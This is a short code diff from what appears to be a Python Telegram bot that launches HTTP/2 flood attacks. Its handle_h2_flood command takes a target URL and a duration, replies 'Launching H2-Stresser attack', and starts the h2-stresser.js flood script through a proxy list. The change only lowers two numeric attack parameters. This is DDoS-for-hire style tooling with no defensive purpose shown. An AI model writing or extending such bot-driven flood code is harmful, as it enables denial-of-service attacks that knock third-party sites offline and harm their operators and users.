@@ -192,7 +192,7 @@ def handle_h2_flood(message):
         duration = parts[2]
         
         bot.reply_to(message, f"Launching H2-Stresser attack on {target_url} for {duration} seconds.")
-        command = ['node', 'h2-stresser.js', target_url, duration, '32', '16', 'proxy.txt']
+        command = ['node', 'h2-stresser.js', target_url, duration, '5', '4', 'proxy.txt']
         subprocess.Popen(command)
 
     except (IndexError):
